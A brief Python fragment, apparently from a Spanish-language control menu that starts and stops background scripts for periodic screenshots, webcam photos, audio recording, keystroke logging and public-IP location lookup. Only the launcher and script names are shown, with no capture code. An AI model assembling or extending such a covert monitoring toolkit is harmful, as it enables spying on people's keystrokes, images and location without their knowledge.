...
def start_script(script_name):
    if script_name in running_processes:
        log_message(f"{script_name} ya está en ejecución.")
    else:
...
# Modificar el comportamiento de las opciones 4, 5, 6, 7, 8 y 9
start_stop_scripts = [
    ("5", "Capturas de pantalla", "screenshot-fivesec.pyw"),
    ("6", "Fotos desde la camara", "camerashot-5sec.pyw"),
    ("7", "Grabacion de audio", "recording.pyw"),
    ("8", "Registro de teclas", "KEYlogger.pyw"),
    ("9", "Ubicacion segun IPv4 publica", "IPpublica.pyw"),
]
